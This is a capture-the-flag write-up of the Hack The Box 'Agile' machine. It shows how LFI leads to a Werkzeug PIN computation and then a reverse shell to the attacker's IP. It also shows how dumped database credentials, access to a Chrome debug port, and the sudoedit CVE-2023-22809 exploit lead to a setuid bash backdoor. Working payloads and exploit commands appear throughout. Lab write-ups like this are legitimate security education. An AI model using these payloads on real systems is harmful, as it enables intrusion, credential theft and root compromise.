---
description: This is a medium box by 0xdf.
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Agile

## Information

<table data-header-hidden><thead><tr><th width="374"></th><th align="right"></th></tr></thead><tbody><tr><td>Name</td><td align="right"><img src="../../../.gitbook/assets/agile.png" alt=""></td></tr><tr><td>OS</td><td align="right">Linux</td></tr><tr><td>Difficulty</td><td align="right">Medium</td></tr><tr><td>Vulnerabilities</td><td align="right">LFI, Misconfiguration </td></tr><tr><td>Languages</td><td align="right">Python</td></tr></tbody></table>

<img src="../../../.gitbook/assets/file.excalidraw.svg" alt="Solution flow graph" class="gitbook-drawing">

## Enumeration

### Nmap

```apacheconf
msplmee@kali:~$ nmap -p- --min-rate 10000 10.10.11.203
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-09 00:52 EDT
Nmap scan report for 10.10.11.203
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds
                                                                                                                                                                                             
msplmee@kali:~$ nmap -p 22,80 -sCV 10.10.11.203
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-09 00:52 EDT
Nmap scan report for 10.10.11.203
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.64 seconds
```

The scan reveals ports 22 (SSH) and 80 (Nginx) open.&#x20;

### Subdomain Brute Force

I try to brute force the DNS server named "superpass.htb" with `ffuf` to check if there are any different subdomains. However, it doesn't return any results.

So let's add this vHost to /etc/hosts file.

```bash
echo '10.10.11.203 superpass.htb' | sudo tee -a /etc/hosts
```

### Website - TCP 80

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

The website has functionality to login.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

I create an account. Once I log in, it takes me to the `/vault` page. There are two functions "Add a password" and "Export".

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

“Add a password” opens a form with the password already filled in. I finish the remaining parts and save it by clicking the icon.

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

"Export" make download a CSV file.

## Shell as www-data

When I click on "Export", there's a GET request to `/vault/export`, which returns a 302 to `/download?fn=[username]_export`_`_`_`[hex].csv`&#x20;

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### LFI

The download `fn` parameter has vulnerable to LFI

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

### Flask Debug

When I try an invalid request file path, the page crashes revealing that the server is running Flask in debug mode.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

I can open the debugger by clicking on the terminal icon in the Python code traceback. Running Python code lets I use a reverse shell. However, Werkzeug secures these interpreters with a PIN.

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

But Werkzeug didn't ensure the safety of the PIN. The PIN can be calculated if I have some strings from the system, using LFI.

Following the [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) guide on cracking this PIN. The PIN is generated via values:

* **Username**: `/proc/self/environ`
* **Mod Name**: This is either `flask.app` or `werkzeug.debug`
* **App Name:** This is either `wsgi_app`, `DebuggedApplication`, or `Flask`.
* **Absolute path of `app.py`:** `getattr(mod, '__file__', None)`
* **MAC Address**: `/sys/class/net/<device id>/address`
* **Machine ID:** `/etc/machine-id`, `/proc/self/cgroup`

Username: www-data

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Mod name: flask.app

App.name: wsgi\_app

Absolute path of app.py: /app/venv/lib/python3.10/site-packages/flask/app.py

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

MAC Address: `int("00:50:56:b9:39:fa".replace(':',''),16) =` 345052363258

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Machine ID: ed5b159560f54721827644bc9b220d00superpass.service

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Once all variables prepared, run exploit script to generate Werkzeug console PIN:

```python
#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
	'www-data',# username
	'flask.app',# modname
	'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

#/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py

private_bits = [
	'345052363258',# str(uuid.getnode()),  /sys/class/net/eth0/address 
	# Machine Id: /etc/machine-id + /proc/self/cgroup
	'ed5b159560f54721827644bc9b220d00superpass.service'
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print("Pin: " + rv)
```

```apacheconf
msplmee@kali:~$ python crack_pin.py 
Pin: 428-436-810
```

### Shell

I get reverse shell with payload from [Revshells](https://www.revshells.com/)

{% code overflow="wrap" %}
```python
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

On sending this, I get a shell at my `pwncat`

{% code overflow="wrap" %}
```apacheconf
msplmee@kali:~/HTB/Machine/Agile$ pwncat-cs -l -p 443                                 
[04:18:16] Welcome to pwncat 🐈!                                                                                                                                              
[04:19:01] received connection from 10.10.11.203:41812                                                                                                                             
[04:19:02] 10.10.11.203:41812: registered new host w/ db                                                                                                                       
(local) pwncat$                                                                                                                                                                              
(remote) www-data@agile:/app/app$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endcode %}

## Shell as corum

I can read the DB connection string from `/app/config_prod.json`

{% code overflow="wrap" %}
```apacheconf
www-data@agile:/app/app$ cat /app/config_prod.json 
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```
{% endcode %}

I use that to connect to the database and dump the passwords

```apacheconf
www-data@agile:/app/app$ mysql -u superpassuser -p
Enter password:
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpass          |
+--------------------+
3 rows in set (0.00 sec)
mysql> use superpass;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_superpass |
+---------------------+
| passwords           |
| users               |
+---------------------+
2 rows in set (0.00 sec)
mysql> select * from passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
5 rows in set (0.00 sec)
```

There's a password for the "agile" which is used by the corum user. &#x20;

Now I can log in as the corum via SSH. The user flag can be found in `/home/corum/user.txt`

```
msplmee@kali:~/HTB/Machine/Agile$ pwncat-cs ssh://corum:5db7caa1d13cc37c9fc2@superpass.htb
[04:41:04] Welcome to pwncat 🐈!  
[04:41:06] superpass.htb:22: registered new host w/ db 
(local) pwncat$         
(remote) corum@agile:/home/corum$ ls
user.txt
(remote) corum@agile:/home/corum$ cat user.txt 
120*****************************
```

## Shell as edwards

&#x20;The `app` directory contains an interesting file: `config_test.json`. This file is not readable by `corum` though. There's a directory for production using `config_prod.json`, and there is also a directory for testing, so let's explore that.

```apacheconf
corum@agile:/app$ ls -l
total 24
drwxr-xr-x 5 corum     runner    4096 Feb  8 16:29 app
drwxr-xr-x 9 runner    runner    4096 Feb  8 16:36 app-testing
-r--r----- 1 dev_admin www-data    88 Jan 25  2023 config_prod.json
-r--r----- 1 dev_admin runner      99 Jan 25  2023 config_test.json
-rwxr-xr-x 1 root      runner     557 Aug  9 09:21 test_and_update.sh
drwxrwxr-x 5 root      dev_admin 4096 Feb  8 16:29 venv
```

The `test_and_update.sh` script:

```bash
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"
```

There's one file of tests in `app-testing`

```apacheconf
corum@agile:/app/app-testing/tests/functional$ ls -l
total 12
drwxrwxr-x 2 runner    runner 4096 Aug  9 09:21 __pycache__
-rw-r----- 1 dev_admin runner   34 Aug  9 09:27 creds.txt
-rw-r--r-- 1 runner    runner 2663 Aug  9 09:27 test_site_interactively.py
```

corum can’t read `creds.txt`. It’s used in `test_site_interactively` to log into the page on `test.superpass.htb`. It’s using Selenium with headless Chrome to load the site:

```python

with open('/app/app-testing/tests/functional/creds.txt', 'r') as f:
    username, password = f.read().strip().split(':')

@pytest.fixture(scope="session")
def driver():
    options = Options()
    #options.add_argument("--no-sandbox")
    options.add_argument("--window-size=1420,1080")
    options.add_argument("--headless")
    options.add_argument("--remote-debugging-port=41829")
    options.add_argument('--disable-gpu')
    options.add_argument('--crash-dumps-dir=/tmp')
    driver = webdriver.Chrome(options=options)
    yield driver
    driver.close()
    
......

def test_login(driver):
    print("starting test_login")
    driver.get('http://test.superpass.htb/account/login')
    time.sleep(1)
    username_input = driver.find_element(By.NAME, "username")
    username_input.send_keys(username)
    password_input = driver.find_element(By.NAME, "password")
    password_input.send_keys(password)
    driver.find_element(By.NAME, "submit").click()
    time.sleep(3)
    title = driver.find_element(By.TAG_NAME, "h1")
    assert title.text == "Welcome to your vault"
```

The `test.superpass.htb` site is defined in `/etc/nginx/sites-available/superpass-test.nginx`

```nginx
server {
    listen 127.0.0.1:80;
    server_name test.superpass.htb;

    location /static {
        alias /app/app-testing/superpass/static;
        expires 365d;
    }
    location / {
        include uwsgi_params;
        proxy_pass http://127.0.0.1:5555;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Protocol $scheme;
    }
}
```

Port 5555 is open.

```apacheconf
corum@agile:$ netstat -tnlp | grep 5555
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      -  
```

I can connect to it by directly creating a tunnel to TCP port 5555 on Agile.

```apacheconf
msplmee@kali:~$ ssh -L 5555:127.0.0.1:5555 corum@superpass.htb
```

I go to `localhost:5555` and see the same page, but it doesn't have LFI vulnerable and is not in debug mode.

Check remote debug port.

```apacheconf
corum@agile:/$ netstat -tnlp | grep 41829
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN      -
```

I use SSH to forward 41829 on my host to 41829 on Agile.

```apacheconf
msplmee@kali:~$ ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
```

### Method 1

Add port 41829 to `chrome://inspect`.

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Clicking on "inspect". The credentials for edwards can be grabbed from here.

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

### Method 2

I read read file `config_test.json` with `file` protocol

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

I go to `devtoolsFrontendUrl`

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```json
{"SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"}
```
{% endcode %}

I use that to connect to the database and get edwards's passwords.

```apacheconf
corum@agile:/$ mysql -u superpasstester -p
Enter password: 
......
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpasstest      |
+--------------------+
3 rows in set (0.00 sec)

mysql> use superpasstest;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------------+
| Tables_in_superpasstest |
+-------------------------+
| passwords               |
| users                   |
+-------------------------+
2 rows in set (0.00 sec)

mysql> select * from passwords;
+----+---------------------+---------------------+---------+------------+----------------------+---------+
| id | created_date        | last_updated_data   | url     | username   | password             | user_id |
+----+---------------------+---------------------+---------+------------+----------------------+---------+
|  1 | 2023-01-25 01:10:54 | 2023-01-25 01:10:54 | agile   | edwards    | d07867c6267dcb5df0af |       1 |
|  2 | 2023-01-25 01:14:17 | 2023-01-25 01:14:17 | twitter | dedwards__ | 7dbfe676b6b564ce5718 |       1 |
+----+---------------------+---------------------+---------+------------+----------------------+---------+
2 rows in set (0.00 sec)
```

I log in as the `edwards` via SSH.

{% code overflow="wrap" %}
```apacheconf
msplmee@kali:~$ pwncat-cs ssh://edwards:d07867c6267dcb5df0af@superpass.htb                  
[06:12:34] Welcome to pwncat 🐈!                                              
[06:12:36] superpass.htb:22: registered new host w/ db                     
(local) pwncat$                                                                              
(remote) edwards@agile:/home/edwards$ id
uid=1002(edwards) gid=1002(edwards) groups=1002(edwards)
```
{% endcode %}

## Shell as root

I can run `sudoedit` for or the "config\_test.json" file and "creds.txt" file as dev\_admin.

```apacheconf
edwards@agile:/$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

The sudo version is older than `1.9.12p2`, so sudoedit is vulnerable to `CVE-2023-22809`. To exploit this vulnerability, I require a file that the `dev_admin` can create, and root can execute.

```apacheconf
edwards@agile:/$ sudo -V
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

I run`pspy64` to check any processes that are run by root and found that the `/app/venv/bin/activate` run by root and owned by the dev\_admin group.

```
edwards@agile:/$ ls -l /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 1976 Aug  9 10:24 /app/venv/bin/activate
```

Exploit `CVE-2023-22809`

{% code overflow="wrap" %}
```apacheconf
edwards@agile:/$ EDITOR="vim -- /app/venv/bin/activate" sudo -u dev_admin sudoedit /app/config_test.json
```
{% endcode %}

```bash
# This file must be used with "source bin/activate" *from bash*
# you cannot run it directly

cp /bin/bash /tmp/msplmee
chmod 4777 /tmp/msplmee

deactivate () {...}
```

After one more minute, the backdoor has moved to the `/tmp` directory and provides a shell access:

```apacheconf
edwards@agile:/$ ls -l /tmp/msplmee 
-rwsrwxrwx 1 root root 1396520 Aug  9 10:32 /tmp/msplmee
edwards@agile:/$ /tmp/msplmee -p
root@agile:/# id
uid=1002(edwards) gid=1002(edwards) euid=0(root) groups=1002(edwards)
root@agile:/# cat /root/root.txt 
781*****************************
```
